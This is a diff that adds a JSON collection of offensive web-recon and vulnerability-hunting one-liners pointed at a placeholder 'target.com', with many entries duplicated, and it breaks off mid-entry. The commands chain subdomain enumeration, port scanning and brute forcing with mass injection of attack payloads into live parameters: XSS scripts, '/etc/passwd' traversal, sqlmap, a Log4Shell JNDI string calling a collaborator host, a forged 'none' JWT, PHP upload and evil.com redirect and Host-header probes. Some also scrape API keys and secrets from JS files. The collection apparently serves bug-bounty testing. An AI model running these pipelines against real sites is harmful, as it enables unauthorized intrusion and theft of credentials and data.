@@ -1,0 +1,918 @@
+[
+  {
+    "title": "Misconfigurations, Tech Detection, and Common Bugs\nIf you want wider coverage, like misconfigurations, tech detection, and common bugs, change the template path to `-t vulnerabilities/`:",
+    "command": "cat urls.txt | httpx -silent -mc 200 | nuclei -silent -t vulnerabilities/ -o results.txt"
+  },
+  {
+    "title": "Subdomain Takeovers - Quick Check\nWant to check for subdomain takeovers in one line?",
+    "command": "subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt"
+  },
+  {
+    "title": "Subdomain Discovery + Live Check\nFor subdomain discovery with live check:",
+    "command": "subfinder -d target.com | httpx -silent -mc 200"
+  },
+  {
+    "title": "Subdomain Takeover Detection\nDetect subdomain takeovers:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Directory Bruteforce (Content Discovery)\nFor directory bruteforce:",
+    "command": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200"
+  },
+  {
+    "title": "Find Open Redirects (Quick Scan)\nTo quickly find open redirects:",
+    "command": "cat urls.txt | gf redirect | httpx -silent"
+  },
+  {
+    "title": "XSS Detection (Using Dalfox)\nFor XSS detection using Dalfox:",
+    "command": "cat urls.txt | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "SQL Injection Discovery\nFor SQL Injection discovery:",
+    "command": "cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -"
+  },
+  {
+    "title": "Subdomain Takeovers - Quick Check\nWant to check for subdomain takeovers in one line?",
+    "command": "subfinder -d example.com | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt"
+  },
+  {
+    "title": "Subdomain Discovery + Live Check\nFor subdomain discovery with live check:",
+    "command": "subfinder -d target.com | httpx -silent -mc 200"
+  },
+  {
+    "title": "Subdomain Takeover Detection\nDetect subdomain takeovers:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Directory Bruteforce (Content Discovery)\nFor directory bruteforce:",
+    "command": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200"
+  },
+  {
+    "title": "Find Open Redirects (Quick Scan)\nTo quickly find open redirects:",
+    "command": "cat urls.txt | gf redirect | httpx -silent"
+  },
+  {
+    "title": "XSS Detection (Using Dalfox)\nFor XSS detection using Dalfox:",
+    "command": "cat urls.txt | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "SQL Injection Discovery\nFor SQL Injection discovery:",
+    "command": "cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -"
+  },
+  {
+    "title": "Find Sensitive Files (Backup, Config, etc.)\nTo find sensitive files like backups and configuration files:",
+    "command": "cat urls.txt | waybackurls | grep -Ei '\\.(bak|old|backup|log|env|sql|config)$'"
+  },
+  {
+    "title": "CORS Misconfiguration Detection\nTo detect CORS misconfigurations:",
+    "command": "cat urls.txt | corscanner"
+  },
+  {
+    "title": "Detect Technologies + Possible CVEs\nTo detect technologies and possible CVEs:",
+    "command": "cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Parameter Discovery (for further testing)\nTo discover parameters for further testing:",
+    "command": "cat urls.txt | waybackurls | uro | grep '?'"
+  },
+  {
+    "title": "Full Recon Chain (Subdomains + Live Check + Technologies + Titles)\nFor full recon chain:",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect"
+  },
+  {
+    "title": "Subdomain Enum + Ports Scan (Fast)\nFor a fast subdomain enumeration and port scan:",
+    "command": "subfinder -d target.com | naabu -silent -top-ports 1000"
+  },
+  {
+    "title": "All URLs from Wayback, CommonCrawl, and AlienVault\nTo get all URLs from Wayback, CommonCrawl, and AlienVault:",
+    "command": "gau target.com | tee urls.txt"
+  },
+  {
+    "title": "Find Secrets in JS Files\nTo find secrets in JS files:",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr \"[:space:]\" \"\\n\" | grep -Ei \"(api|key|token|secret|password|passwd|authorization)=\"'"
+  },
+  {
+    "title": "Find Open AWS Buckets\nTo find open AWS buckets:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml"
+  },
+  {
+    "title": "Find Misconfigured Login Panels\nTo find misconfigured login panels:",
+    "command": "cat urls.txt | nuclei -silent -t exposed-panels/"
+  },
+  {
+    "title": "Check All Parameters for Reflected XSS\nTo check all parameters for reflected XSS:",
+    "command": "cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "Check for Exposed Git Repositories\nTo check for exposed Git repositories:",
+    "command": "cat urls.txt | httpx -silent -path \"/.git/config\" -mc 200"
+  },
+  {
+    "title": "Extract All Parameters from URLs (for manual testing)\nTo extract all parameters from URLs for manual testing:",
+    "command": "cat urls.txt | uro | grep '?'"
+  },
+  {
+    "title": "Takeover Domains from Subdomain List\nTo perform takeover checks on domains from a subdomain list:",
+    "command": "cat subdomains.txt | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Find CVEs Based on Technology\nTo find CVEs based on technology:",
+    "command": "cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Find Top Ports + Services for All Subdomains (Recon + Port Scan)\nTo find the top ports and services for all subdomains:",
+    "command": "subfinder -d target.com | naabu -top-ports 1000 -silent"
+  },
+  {
+    "title": "Extract All Endpoints from JS Files (JS Analysis)\nTo extract all endpoints from JS files for analysis:",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE \"(/api/v[0-9]+/[^\\\"'\\'']+|/[a-zA-Z0-9_/.-]+\\.(php|aspx|jsp|html|json|xml|txt))\"'"
+  },
+  {
+    "title": "Subdomain Discovery + Live Check\nFor subdomain discovery with live check:",
+    "command": "subfinder -d target.com | httpx -silent -mc 200"
+  },
+  {
+    "title": "Subdomain Takeover Detection\nDetect subdomain takeovers:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Directory Bruteforce (Content Discovery)\nFor directory bruteforce:",
+    "command": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200"
+  },
+  {
+    "title": "Find Open Redirects (Quick Scan)\nTo quickly find open redirects:",
+    "command": "cat urls.txt | gf redirect | httpx -silent"
+  },
+  {
+    "title": "XSS Detection (Using Dalfox)\nFor XSS detection using Dalfox:",
+    "command": "cat urls.txt | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "SQL Injection Discovery\nFor SQL Injection discovery:",
+    "command": "cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -"
+  },
+  {
+    "title": "Find Sensitive Files (Backup, Config, etc.)\nTo find sensitive files like backups and configuration files:",
+    "command": "cat urls.txt | waybackurls | grep -Ei '\\.(bak|old|backup|log|env|sql|config)$'"
+  },
+  {
+    "title": "CORS Misconfiguration Detection\nTo detect CORS misconfigurations:",
+    "command": "cat urls.txt | corscanner"
+  },
+  {
+    "title": "Detect Technologies + Possible CVEs\nTo detect technologies and possible CVEs:",
+    "command": "cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Parameter Discovery (for further testing)\nTo discover parameters for further testing:",
+    "command": "cat urls.txt | waybackurls | uro | grep '?'"
+  },
+  {
+    "title": "Full Recon Chain (Subdomains + Live Check + Technologies + Titles)\nFor full recon chain:",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect"
+  },
+  {
+    "title": "Subdomain Enum + Ports Scan (Fast)\nFor a fast subdomain enumeration and port scan:",
+    "command": "subfinder -d target.com | naabu -silent -top-ports 1000"
+  },
+  {
+    "title": "All URLs from Wayback, CommonCrawl, and AlienVault\nTo get all URLs from Wayback, CommonCrawl, and AlienVault:",
+    "command": "gau target.com | tee urls.txt"
+  },
+  {
+    "title": "Find Secrets in JS Files\nTo find secrets in JS files:",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | tr \"[:space:]\" \"\\n\" | grep -Ei \"(api|key|token|secret|password|passwd|authorization)=\"'"
+  },
+  {
+    "title": "Find Open AWS Buckets\nTo find open AWS buckets:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t s3-detect.yaml"
+  },
+  {
+    "title": "Find Misconfigured Login Panels\nTo find misconfigured login panels:",
+    "command": "cat urls.txt | nuclei -silent -t exposed-panels/"
+  },
+  {
+    "title": "Check All Parameters for Reflected XSS\nTo check all parameters for reflected XSS:",
+    "command": "cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "Check for Exposed Git Repositories\nTo check for exposed Git repositories:",
+    "command": "cat urls.txt | httpx -silent -path \"/.git/config\" -mc 200"
+  },
+  {
+    "title": "Extract All Parameters from URLs (for manual testing)\nTo extract all parameters from URLs for manual testing:",
+    "command": "cat urls.txt | uro | grep '?'"
+  },
+  {
+    "title": "Takeover Domains from Subdomain List\nTo perform takeover checks on domains from a subdomain list:",
+    "command": "cat subdomains.txt | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Find CVEs Based on Technology\nTo find CVEs based on technology:",
+    "command": "cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Find Top Ports + Services for All Subdomains (Recon + Port Scan)\nTo find the top ports and services for all subdomains:",
+    "command": "subfinder -d target.com | naabu -top-ports 1000 -silent"
+  },
+  {
+    "title": "Extract All Endpoints from JS Files (JS Analysis)\nTo extract all endpoints from JS files for analysis:",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -silent | xargs -I{} bash -c 'curl -s {} | grep -oE \"(/api/v[0-9]+/[^\\\"'\\'']+|/[a-zA-Z0-9_/.-]+\\.(php|aspx|jsp|html|json|xml|txt))\"'"
+  },
+  {
+    "title": "Scan for Backup Files (Old Config/DB Dumps)\nTo scan for backup files, old config, or DB dumps:",
+    "command": "cat urls.txt | httpx -silent -path-list <(echo -e \"/.env\\n/config.php\\n/backup.zip\\n/database.sql\\n/admin.bak\") -mc 200"
+  },
+  {
+    "title": "Find Open .git Folders (Source Leak)\nTo find open `.git` folders:",
+    "command": "cat subdomains.txt | httpx -silent -path \"/.git/config\" -mc 200"
+  },
+  {
+    "title": "WordPress Scan (Detect Plugins, Themes, etc.)\nFor WordPress scan to detect plugins, themes, etc.:",
+    "command": "cat urls.txt | nuclei -silent -t technologies/wordpress/"
+  },
+  {
+    "title": "Hunt for CRLF Injection (Newline Injection)\nTo hunt for CRLF injection:",
+    "command": "cat urls.txt | gf crlf | qsreplace '%0d%0aTestHeader:TestValue' | httpx -silent -hdrs"
+  },
+  {
+    "title": "Detect CORS Misconfigurations (Very Common Bug)\nTo detect CORS misconfigurations:",
+    "command": "cat urls.txt | corscanner"
+  },
+  {
+    "title": "Test All URLs for LFI (Local File Inclusion)\nTo test all URLs for LFI:",
+    "command": "cat urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mc 200"
+  },
+  {
+    "title": "Find Information Disclosure via Backup Files\nTo find information disclosure via backup files:",
+    "command": "cat urls.txt | waybackurls | grep -Ei '\\.(bak|old|backup|log|sql|env|zip|tar|gz|rar)$' | httpx -silent -mc 200"
+  },
+  {
+    "title": "Find Exposed Panels (Admin, Login, etc.)\nTo find exposed admin/login panels:",
+    "command": "cat urls.txt | nuclei -silent -t exposed-panels/"
+  },
+  {
+    "title": "Full JS Hunting + Secrets Scan (for frontend leaks)\nFor full JS hunting and secrets scan:",
+    "command": "gau target.com | grep '\\.js$' | httpx -silent | xargs -I{} bash -c 'echo {} && curl -s {} | tr -d \"\\r\" | grep -E -i \"(api[_-]?key|secret|token|auth|password|passwd|client[_-]?id|client[_-]?secret)=\"'"
+  },
+  {
+    "title": "Search for Open Redirects (URL Redirect issues)\nTo search for open redirects:",
+    "command": "cat urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -mc 302,301 -fr 'evil.com'"
+  },
+  {
+    "title": "Quick Scan for SQL Injection\nFor a quick SQL injection scan:",
+    "command": "cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -"
+  },
+  {
+    "title": "Find Interesting Endpoints (Like admin, login, debug, etc.)\nTo find interesting endpoints like admin, login, debug, etc.:",
+    "command": "gau target.com | grep -Ei '/(admin|login|debug|test|backup|panel|dashboard)'"
+  },
+  {
+    "title": "Check for Exposed Config Files (like .env, .git, .DS_Store)\nTo check for exposed config files:",
+    "command": "cat urls.txt | httpx -silent -path-list <(echo -e '/.env\\n/.git/config\\n/.DS_Store\\n/config.php\\n/config.json') -mc 200"
+  },
+  {
+    "title": "Scan for CVE in All Subdomains\nTo scan for CVEs in all subdomains:",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Full Backup File Search (All extensions that leak data)\nTo search for all extensions that leak backup files:",
+    "command": "gau target.com | grep -Ei '\\.(bak|old|backup|sql|log|tar|zip|gz|rar|swp|env|config)$' | httpx -silent -mc 200"
+  },
+  {
+    "title": "Check for CORS Misconfigurations\nTo check for CORS misconfigurations:",
+    "command": "cat urls.txt | corscanner"
+  },
+  {
+    "title": "Scan for Open Admin Panels (Exposed Panels)",
+    "command": "cat urls.txt | nuclei -silent -t exposed-panels/"
+  },
+  {
+    "title": "ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)",
+    "command": "subfinder -d target.com | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/"
+  },
+  {
+    "title": "All-in-One Recon Pipeline (Subdomains → Probing → Ports → Tech Detection → Titles)",
+    "command": "subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | anew alive.txt"
+  },
+  {
+    "title": "Mass Fetch JS Files + Find Secrets + Endpoints + Tokens",
+    "command": "cat alive.txt | hakrawler -subs | grep '\\.js$' | anew jsfiles.txt && cat jsfiles.txt | xargs -I{} bash -c 'curl -s {} | tr -d \"\\r\" | egrep -i \"(api|key|token|secret|password|passwd|authorization|bearer|client_id|client_secret)\"' | tee secrets.txt"
+  },
+  {
+    "title": "Check for Open Redirects Across All Params (with Payload Injection)",
+    "command": "cat alive.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -mc 302,301"
+  },
+  {
+    "title": "Automatic Vulnerability Scan (Subdomains to CVE Detection + Misconfigs)",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t cves/,misconfiguration/"
+  },
+  {
+    "title": "Backup Files Bruteforce Across All Hosts",
+    "command": "cat alive.txt | httpx -silent -path-list <(echo -e \"/.git/config\\n/.env\\n/database.sql\\n/backup.zip\\n/config.php\\n/wp-config.php\") -mc 200 | tee backups.txt"
+  },
+  {
+    "title": "Check for Parameter-Based XSS (Direct Injection Testing)",
+    "command": "cat alive.txt | hakrawler -subs -depth 2 | gf xss | qsreplace '\"><script>alert(document.domain)</script>' | httpx -silent -fr 'alert(document.domain)'"
+  },
+  {
+    "title": "Automated LFI Discovery (Common Payloads)",
+    "command": "cat alive.txt | gf lfi | qsreplace '../../../../../../etc/passwd' | httpx -silent -mc 200"
+  },
+  {
+    "title": "Fuzz Parameters & Check Reflections (for XSS & Injection Discovery)",
+    "command": "cat alive.txt | waybackurls | gf params | uro | qsreplace FUZZ | ffuf -u FUZZ -w wordlists/payloads/xss.txt -fr 'FUZZ'"
+  },
+  {
+    "title": "Subdomain Takeover Detection (Live Scan + Detection)",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/"
+  },
+  {
+    "title": "Full Asset Discovery + Technology Analysis + Title Collection",
+    "command": "assetfinder --subs-only target.com | httpx -silent -title -tech-detect | tee assets_with_tech.txt"
+  },
+  {
+    "title": "Mega Pipeline - Subdomains → URLs → Parameters → XSS/SQL/Secrets",
+    "command": "subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc | tee xss_poc.txt && cat urls.txt | grep '\\.js$' | xargs -I{} bash -c 'curl -s {} | egrep -i \"(api|key|token|secret|password|passwd|auth)\"' | tee secrets.txt"
+  },
+  {
+    "title": "Ultimate Recon Monster (Subdomains → Probing → Ports → Technologies → CVEs)",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Automated Asset Hunting + JS Analysis + Secret Finder",
+    "command": "subfinder -d target.com | httpx -silent -mc 200 | hakrawler -subs -depth 3 -plain | anew urls.txt && cat urls.txt | grep '\\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d \"\\r\" | gf secrets | tee -a secrets.txt'"
+  },
+  {
+    "title": "Mass Fuzz Every Parameter with XSS, LFI, SQLi Payloads (Ultimate Param Attacker)",
+    "command": "cat urls.txt | gf xss,lfi,sqli | uro | qsreplace FUZZ | ffuf -u FUZZ -w xss.txt,lfi.txt,sqli.txt -fr \"FUZZ\" | tee param_fuzz.txt"
+  },
+  {
+    "title": "Subdomain Takeover, DNS Hijack, Misconfig Scan - All In One",
+    "command": "subfinder -d target.com | dnsx -a -resp-only -silent | nuclei -silent -t takeovers/,dns/"
+  },
+  {
+    "title": "Automatic Full Backup File Bruteforcing Across All Hosts (Super Leaks Finder)",
+    "command": "subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backups_found.txt"
+  },
+  {
+    "title": "Deep Directory Brute Force (Smart Recursive Finder)",
+    "command": "subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | xargs -I{} gobuster dir -u {} -w big_wordlist.txt -t 50 -o gobuster_output.txt"
+  },
+  {
+    "title": "Blind SSRF Auto-Detection in All Parameters",
+    "command": "cat urls.txt | gf ssrf | qsreplace 'http://canarytoken.com' | httpx -silent -mc 200 -fr 'canarytoken'"
+  },
+  {
+    "title": "Mega Wordlist Generator from Wayback + JS + HTML Comments + Robots.txt + Sitemap.xml",
+    "command": "subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf wordlist | anew wordlist.txt"
+  },
+  {
+    "title": "Full Sitemap & Robots Extraction Across Subdomains",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(echo -e \"/robots.txt\\n/sitemap.xml\") -mc 200 | tee robots_sitemaps.txt"
+  },
+  {
+    "title": "CRLF Injection Full Auto Discovery & Exploit",
+    "command": "cat urls.txt | gf crlf | qsreplace '%0d%0aTest-Header: InjectedValue' | httpx -silent -hdrs | tee crlf_vulns.txt"
+  },
+  {
+    "title": "CSP Analyzer Across All Hosts (Misconfig Finder)",
+    "command": "cat alive.txt | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_misconfig.txt"
+  },
+  {
+    "title": "Full JS Endpoint Extraction + Sensitive Function Search (eval, document.write, etc.)",
+    "command": "cat urls.txt | grep '\\.js$' | xargs -I{} bash -c 'curl -s {} | grep -E -o \"(http|https)://[^\\\" ]+\" | anew js_endpoints.txt && curl -s {} | egrep -i \"(document\\.write|eval|innerHTML|fetch|XMLHttpRequest|localStorage|sessionStorage|cookie)\" | tee -a sensitive_js.txt'"
+  },
+  {
+    "title": "Recon + Full Vuln Scan + CORS, Headers, CVE, Misconfig, Secrets — One Command to Rule Them All",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee alive.txt && cat alive.txt | nuclei -silent -t cves/,misconfiguration/,exposures/,default-logins/,panels/ | tee findings.txt && cat alive.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | gf xss,sqli,lfi,ssrf | dalfox pipe --skip-bav --only-poc | tee vulns.txt && cat urls.txt | grep '\\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d \"\\r\" | gf secrets' | tee secrets_found.txt"
+  },
+  {
+    "title": "Subdomain Takeover + Open Redirect Chain (Full Passive → Exploit Ready)",
+    "command": "subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/,redirect/ -o takeover_redirects.txt"
+  },
+  {
+    "title": "Full Parameter Discovery + Automated Fuzzing (XSS, SQLi, LFI, SSRF)",
+    "command": "gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/lfi.txt,payloads/sqli.txt,payloads/ssrf.txt -fr \"FUZZ\" | tee param_vulns.txt"
+  },
+  {
+    "title": "Auto Search for Backup Files + Leaked Configs (All Subdomains)",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backup_leaks.txt"
+  },
+  {
+    "title": "Deep Web Archive Scraping + JS Secrets Extraction",
+    "command": "gau --subs target.com | grep '\\.js$' | httpx -silent -status-code -mc 200 | xargs -I{} bash -c 'curl -s {} | gf secrets' | tee js_secrets.txt"
+  },
+  {
+    "title": "Auto-Dump All Endpoints from Wayback, JS, Robots.txt, Sitemap.xml",
+    "command": "subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent -path-list <(echo -e \"/robots.txt\\n/sitemap.xml\") -mc 200 | hakrawler -subs -depth 3 | anew all_urls.txt"
+  },
+  {
+    "title": "CSP Bypass Finder (Auto Fetch CSP Across All Subdomains)",
+    "command": "subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_policies.txt"
+  },
+  {
+    "title": "Automatic SSRF Detection (Using Collaborator/Canarytokens)",
+    "command": "gau target.com | gf ssrf | qsreplace 'http://your-collaborator-url.burpcollaborator.net' | httpx -silent"
+  },
+  {
+    "title": "Deep Search for Hidden Panels + Config Pages (Across All Ports)",
+    "command": "subfinder -d target.com | httpx -silent -ports 80,443,8080,8443 | nuclei -silent -t panels/,exposures/configs/ -o exposed_panels.txt"
+  },
+  {
+    "title": "Entire Subdomain + Tech Stack + CVE + Misconfig Scan (Full Recon Bomb)",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | nuclei -silent -t cves/,misconfiguration/ -o full_scan.txt"
+  },
+  {
+    "title": "Auto-Scrape HTML Comments for Sensitive Info",
+    "command": "cat all_urls.txt | httpx -silent -mc 200 -fr 'text/html' -body | grep -iE \"<!--.*-->\" | tee html_comments.txt"
+  },
+  {
+    "title": "URL Extraction from JS Files (Full Recursive)",
+    "command": "cat all_urls.txt | grep '\\.js$' | xargs -I{} bash -c 'curl -s {} | grep -Eo \"(https?|ftp)://[a-zA-Z0-9./?=_-]*\"' | anew extracted_urls.txt"
+  },
+  {
+    "title": "Super Bruteforce for Backup + Git + Env + SQL Dumps",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(echo -e \"/.git/\\n/.env\\n/database.sql\\n/backup.zip\\n/config.yml\") -mc 200 | tee sensitive_files.txt"
+  },
+  {
+    "title": "Advanced Open Redirect Scanner Across All Params",
+    "command": "cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt"
+  },
+  {
+    "title": "Full Headers Security Misconfig Audit",
+    "command": "subfinder -d target.com | httpx -silent -path / -mc 200 -hdrs | nuclei -silent -t misconfiguration/http-headers/ -o header_issues.txt"
+  },
+  {
+    "title": "Auto-Gather All IPs, ASN, WHOIS for Every Subdomain",
+    "command": "subfinder -d target.com | dnsx -a -resp-only | anew all_ips.txt && cat all_ips.txt | xargs -I{} sh -c 'whois {} | grep -iE \"OrgName|NetName|CIDR\"' | tee whois_lookup.txt"
+  },
+  {
+    "title": "Master Recon + Scan Pipeline (One-Liner)",
+    "command": "subfinder -d target.com | tee subs.txt && cat subs.txt | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_info.txt && cat subs.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | nuclei -silent -t cves/,misconfiguration/,takeovers/,panels/,redirect/ -o nuclei_findings.txt && cat urls.txt | gf xss,sqli,lfi,ssrf,redirect | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt,payloads/sqli.txt,payloads/lfi.txt,payloads/ssrf.txt -fr \"FUZZ\" | tee param_scan.txt"
+  },
+  {
+    "title": "Additional Specific Recon + Vulnerability Scanning Commands\n\n#### Directory Traversal (Across All Endpoints)",
+    "command": "cat all_urls.txt | gf lfi | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x' -o traversal_hits.txt"
+  },
+  {
+    "title": "# Exposed Git Repos Finder (Automated)",
+    "command": "subfinder -d target.com | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git.txt"
+  },
+  {
+    "title": "# IDOR Discovery (Bruteforce Parameter Tampering)",
+    "command": "cat all_urls.txt | gf idor | qsreplace 'id=123' | anew idor_urls.txt && qsreplace 'id=124' | httpx -silent -mc 200 -o possible_idor.txt"
+  },
+  {
+    "title": "# JWT Token Misconfig (None Algorithm)",
+    "command": "cat all_urls.txt | grep -Ei 'jwt|token' | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none.txt"
+  },
+  {
+    "title": "# Unrestricted File Upload (Testing Common Upload Points)",
+    "command": "cat all_urls.txt | gf upload | qsreplace 'file=payload.php' | httpx -silent -upload-file payload.php -o upload_findings.txt"
+  },
+  {
+    "title": "# Path Confusion + Overlays (Detect Double Extensions)",
+    "command": "cat all_urls.txt | sed 's/$/%00index.php/' | httpx -silent -mc 200 -o path_confusion.txt"
+  },
+  {
+    "title": "# CORS Wildcard + Credentials Misconfig",
+    "command": "subfinder -d target.com | httpx -silent -path / -H 'Origin: https://evil.com' -hdrs | grep -i 'access-control-allow-origin' | grep 'evil.com' | tee weak_cors.txt"
+  },
+  {
+    "title": "# Log4Shell Finder (Old but Gold)",
+    "command": "cat all_urls.txt | gf ssrf | qsreplace '${jndi:ldap://your-collaborator-url.burpcollaborator.net}' | httpx -silent"
+  },
+  {
+    "title": "# Server Side Template Injection (SSTI Detection)",
+    "command": "cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_hits.txt"
+  },
+  {
+    "title": "# Prototype Pollution Detection (Direct & Indirect)",
+    "command": "cat all_urls.txt | gf parameters | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt"
+  },
+  {
+    "title": "# Exposed Debug Pages (Stack Traces, Debug Consoles)",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(echo -e '/debug\\n/_profiler\\n/_debugbar\\n/_error') -mc 200 -o debug_pages.txt"
+  },
+  {
+    "title": "# Email Leaks in JS Files",
+    "command": "cat all_urls.txt | grep '\\.js$' | xargs -I{} curl -s {} | grep -Eo \"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}\" | tee emails_found.txt"
+  },
+  {
+    "title": "Cloud Misconfig - Public S3 Buckets",
+    "command": "subfinder -d target.com | httpx -silent -path / -hdrs | grep -i 'x-amz-bucket-region' | tee public_s3.txt"
+  },
+  {
+    "title": "Exposed Admin Panels (Full Auto Discovery)",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/admin-panels.txt) -mc 200 -o exposed_admins.txt"
+  },
+  {
+    "title": "Mass Content Injection Check (Reflected Params)",
+    "command": "cat all_urls.txt | gf xss | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o reflected_xss.txt"
+  },
+  {
+    "title": "BONUS — Ultimate ALL Misconfig Scanner (Headers, Panels, Debug, Leaks)",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t misconfiguration/ -o misconfigs_found.txt"
+  },
+  {
+    "title": "API Key Leaks in JS Files",
+    "command": "cat all_js_urls.txt | xargs -I{} curl -s {} | grep -Eo 'AIza[0-9A-Za-z_-]{35}|sk_live_[0-9a-zA-Z]{24}' | tee leaked_api_keys.txt"
+  },
+  {
+    "title": "Backup Files Discovery (Think: .bak, .old, .swp)",
+    "command": "cat all_urls.txt | sed -E 's/(.*)/\\1~\\n\\1.bak\\n\\1.old\\n\\1.swp/' | httpx -silent -mc 200 -o backup_files.txt"
+  },
+  {
+    "title": "PHP Unit RCE Finder (Real-World Gold)",
+    "command": "subfinder -d target.com | httpx -silent -path /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -mc 200 -o phpunit_rce.txt"
+  },
+  {
+    "title": "GraphQL Misconfig Detection (Introspection Enabled)",
+    "command": "cat all_urls.txt | grep 'graphql' | xargs -I{} curl -s -X POST -d '{\"query\":\"{__schema{types{name}}}\"}' {} | grep -iq 'types' && echo \"{} introspection enabled\" >> graphql_misconfigs.txt"
+  },
+  {
+    "title": "Host Header Injection",
+    "command": "cat all_urls.txt | httpx -silent -H 'Host: evil.com' -hdrs | grep -i 'evil.com' | tee host_header_injection.txt"
+  },
+  {
+    "title": "Open Redirect Finder (Redirection Abuse)",
+    "command": "cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'https://evil.com' -o open_redirects.txt"
+  },
+  {
+    "title": "Session Fixation Detection",
